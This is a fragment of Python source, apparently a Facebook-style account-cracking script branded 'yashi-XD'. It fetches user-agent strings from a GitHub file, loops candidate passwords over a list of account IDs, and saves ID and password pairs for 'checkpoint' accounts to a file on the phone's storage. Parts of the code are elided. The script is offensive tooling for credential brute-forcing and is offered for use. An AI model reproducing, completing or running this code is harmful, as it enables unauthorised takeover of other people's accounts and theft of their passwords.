...
def uaku():
   ...
   a=requests.get('https://github.com/yashih3r3/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
...
def crack(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[yashi-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():              
                open('/sdcard/yashi-CP.txt', 'a').write(idf+'|'+pw+'\n')
                if 'y' in cpp:
